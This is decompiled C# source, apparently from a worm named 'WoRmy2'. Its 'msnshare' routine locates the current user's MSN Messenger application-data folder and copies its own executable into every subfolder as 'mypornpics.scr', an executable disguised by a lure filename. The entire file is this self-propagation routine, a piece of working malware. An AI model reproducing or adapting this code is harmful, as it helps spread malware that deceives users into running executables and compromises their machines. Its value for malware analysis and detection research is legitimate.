using System;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace WoRmy2;

[StandardModule]
internal sealed class msnshare
{
	public static void msnshare_sp()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string executablePath = default(string);
		string[] directories = default(string[]);
		string text = default(string);
		int upperBound = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 310:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0019;
						case 4:
							goto IL_0022;
						case 5:
							goto IL_003f;
						case 6:
							goto IL_005b;
						case 7:
							goto IL_0060;
						case 8:
							goto IL_0063;
						case 9:
							goto IL_006e;
						case 10:
							goto IL_0083;
						case 11:
							goto IL_00a0;
						case 12:
							goto IL_00b9;
						case 13:
						case 14:
						case 15:
							goto IL_00d1;
						default:
							goto end_IL_0000;
						case 16:
						case 17:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_00d1:
					num = 15;
					num5 = checked(num5 + 1);
					goto IL_007e;
					IL_00b9:
					num = 12;
					File.Copy(executablePath, directories[num5] + "\\mypornpics.scr");
					goto IL_00d1;
					IL_0009:
					num = 2;
					_ = Assembly.GetExecutingAssembly().GetModules()[0];
					goto IL_0019;
					IL_0019:
					num = 3;
					executablePath = Application.get_ExecutablePath();
					goto IL_0022;
					IL_0022:
					num = 4;
					text = "C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Microsoft\\Messenger\\";
					goto IL_003f;
					IL_003f:
					num = 5;
					if (Operators.CompareString(FileSystem.Dir(text, (FileAttribute)16), "", false) == 0)
					{
						goto end_IL_0000_2;
					}
					goto IL_005b;
					IL_005b:
					num = 6;
					num5 = 0;
					goto IL_0060;
					IL_0060:
					num = 7;
					goto IL_0063;
					IL_0063:
					num = 8;
					directories = Directory.GetDirectories(text);
					goto IL_006e;
					IL_006e:
					num = 9;
					upperBound = directories.GetUpperBound(0);
					num5 = 0;
					goto IL_007e;
					IL_007e:
					if (num5 > upperBound)
					{
						goto end_IL_0000_2;
					}
					goto IL_0083;
					IL_0083:
					num = 10;
					if (Operators.CompareString(FileSystem.Dir(directories[num5], (FileAttribute)16), "", false) != 0)
					{
						goto IL_00a0;
					}
					goto IL_00d1;
					IL_00a0:
					num = 11;
					if (!File.Exists(directories[num5] + "\\mypornpics.scr"))
					{
						goto IL_00b9;
					}
					goto IL_00d1;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 310;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
